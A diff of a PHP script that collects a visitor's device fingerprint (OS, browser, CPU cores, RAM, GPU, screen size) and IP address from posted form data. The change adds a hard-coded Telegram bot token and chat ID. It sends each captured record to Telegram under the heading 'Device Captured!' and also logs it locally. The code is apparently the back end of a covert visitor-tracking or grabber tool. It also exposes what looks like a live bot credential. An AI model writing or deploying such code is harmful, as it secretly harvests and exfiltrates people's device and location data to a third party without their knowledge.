@@ -1,60 +1,33 @@
 <?php
 header('Content-Type: text/html');
-{
-  $ptf = $_POST['Ptf'];
-  $brw = $_POST['Brw'];
-  $cc = $_POST['Cc'];
-  $ram = $_POST['Ram'];
-  $ven = $_POST['Ven'];
-  $ren = $_POST['Ren'];
-  $ht = $_POST['Ht'];
-  $wd = $_POST['Wd'];
-  $os = $_POST['Os'];
 
-  function getUserIP()
-  {
-    // Get real visitor IP
-    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
-    {
-      $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
-      $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
-    }
-    $client  = @$_SERVER['HTTP_CLIENT_IP'];
-    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
-    $remote  = $_SERVER['REMOTE_ADDR'];
+// --- YOUR CONFIG ---
+$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
+$chatId = "6862649950";
 
-    if(filter_var($client, FILTER_VALIDATE_IP))
-    {
-        $ip = $client;
-    }
-    elseif(filter_var($forward, FILTER_VALIDATE_IP))
-    {
-        $ip = $forward;
-    }
-    else
-    {
-        $ip = $remote;
-    }
-    return $ip;
-  }
+// 1. Capture Data (Matches your original file)
+$ptf = $_POST['Ptf']; $brw = $_POST['Brw']; $cc = $_POST['Cc'];
+$ram = $_POST['Ram']; $ven = $_POST['Ven']; $ren = $_POST['Ren'];
+$ht = $_POST['Ht'];   $wd = $_POST['Wd'];   $os = $_POST['Os'];
 
-  $ip = getUserIP();
-
-  $data = array('platform' => $ptf,
-  'browser' => $brw,
-  'cores' => $cc,
-  'ram' => $ram,
-  'vendor' => $ven,
-  'render' => $ren,
-  'ip' => $ip,
-  'ht' => $ht,
-  'wd' => $wd,
-  'os' => $os);
-
-  $json_data = json_encode($data);
-
-  $f = fopen('../../logs/info.txt', 'w+');
-  fwrite($f, $json_data);
-  fclose($f);
+function getUserIP() {
+    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) return $_SERVER["HTTP_CF_CONNECTING_IP"];
+    return $_SERVER['REMOTE_ADDR'];
 }
+$ip = getUserIP();
 
+// 2. Format Telegram Message
+$msg = "*Device Captured!* \n\n" .
+       "OS: $os\nPlatform: $ptf\nBrowser: $brw\nIP: $ip\n" .
+       "Cores: $cc\nRAM: $ram\nGPU: $ven $ren\nRes: {$ht}x{$wd}";
+
+// 3. Send to Telegram
+$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
+file_get_contents($url);
+
+// 4. Save Locally (Backup)
+$data = array('platform'=>$ptf, 'browser'=>$brw, 'cores'=>$cc, 'ram'=>$ram, 'vendor'=>$ven, 'render'=>$ren, 'ip'=>$ip, 'ht'=>$ht, 'wd'=>$wd, 'os'=>$os);
+$f = fopen('../../logs/info.txt', 'w+');
+fwrite($f, json_encode($data));
+fclose($f);
+?>
